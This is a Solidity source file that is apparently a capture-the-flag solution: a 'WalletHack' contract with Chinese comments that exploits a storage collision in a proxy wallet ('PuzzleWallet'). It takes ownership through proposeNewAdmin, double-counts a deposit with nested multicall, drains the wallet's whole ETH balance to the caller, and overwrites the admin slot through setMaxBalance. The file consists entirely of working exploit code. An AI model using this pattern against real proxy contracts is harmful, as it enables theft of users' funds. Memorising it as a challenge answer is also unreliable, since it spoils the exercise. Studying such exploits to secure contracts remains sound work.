// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface XWalletI {
    function owner() external view returns (address);
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    function maxBalance() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;

    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract WalletHack {
    XWalletI wallet;

    constructor(address _wallet) {
        wallet = XWalletI(_wallet);
    }

    function hack() public payable {
        // 相当于将 WalletHack 设置成 PuzzleWallet 的 owner
        wallet.proposeNewAdmin(address(this));
        // 以 owner 身份，讲 WalletHack 加入 whitelist
        wallet.addToWhitelist(address(this));

        // 构造 multicall data, 里面有 2 比交易
        bytes[] memory calls = new bytes[](2);
        // 第一笔交易就是 deposit
        calls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        // 第二笔交易是另一个 multicall data，里面只包含一笔 deposit 交易
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCall);
        // 传入的就是 wallet.balance, 这样最终记录的 balances[address(this)] 就是2倍，正好可以全部取出
        uint256 baseBalance = address(wallet).balance;
        require(msg.value >= baseBalance, "insufficient msg.value for multicall");
        wallet.multicall{value: baseBalance}(calls);

        // eth 余额转回给 msg.sender
        wallet.execute(msg.sender, baseBalance * 2, "");

        // 将 msg.sender 转换成 uint256 舍之道 maxBalance, 相当于修改了 `admin`
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
